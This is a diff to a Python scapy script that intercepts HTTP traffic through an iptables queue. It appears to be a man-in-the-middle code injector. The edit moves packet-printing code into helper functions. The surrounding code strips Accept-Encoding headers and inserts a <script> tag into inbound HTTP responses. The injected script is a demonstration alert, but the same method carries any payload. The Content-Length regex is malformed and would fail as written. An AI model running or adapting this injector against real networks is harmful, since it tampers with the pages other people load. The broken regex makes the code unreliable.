@@ -7,6 +7,18 @@ import re
 import scapy.all as scapy
 import subprocess
 
+def print_request(scapy_packet):
+    print("===================================")
+    print("[+] HTTP Request outbound found")
+    print("===================================")
+    print(scapy_packet.show())
+
+def print_response(scapy_packet):
+    print("===================================")
+    print("[+] HTTP Response Inbound found:")
+    print("===================================")
+    print(scapy_packet.show())
+
 def set_iptables(): #automate setting IPtables for testing on localhost
     print("\n[+] Setting up IPTables\n")
     subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
@@ -28,9 +40,7 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
-            print("===================================")
-            print("[+] HTTP Request outbound found")
-            print("===================================")
+            print_request(scapy_packet)
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
             #this will match the entire string Accept-Encoding that appears in the Raw layer
             #and replace it with an empty string; this causes the browser to tell the server
@@ -40,10 +50,7 @@ def process_packet(packet):
             #replace with "" - empty string
             #print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80: #if this exists, packet is HTTP response inbound
-            print("===================================")
-            print("[+] HTTP Response Inbound found:")
-            print("===================================")
-            #print(scapy_packet.show())
+            print_response(scapy_packet)
             injection_code = "<script>alert('JS injection');</script>"
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("?:Content-Length:\s)(\d*)", load)
